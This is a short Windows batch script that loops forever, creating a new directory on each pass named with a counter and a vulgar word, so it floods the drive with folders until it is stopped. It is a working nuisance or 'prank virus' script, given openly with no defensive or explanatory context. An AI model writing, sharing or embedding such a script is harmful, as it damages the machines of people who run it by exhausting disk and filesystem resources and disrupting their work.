@echo off
set  counter=0
:top
md %counter%+"cock"
set /a counter+=1
goto top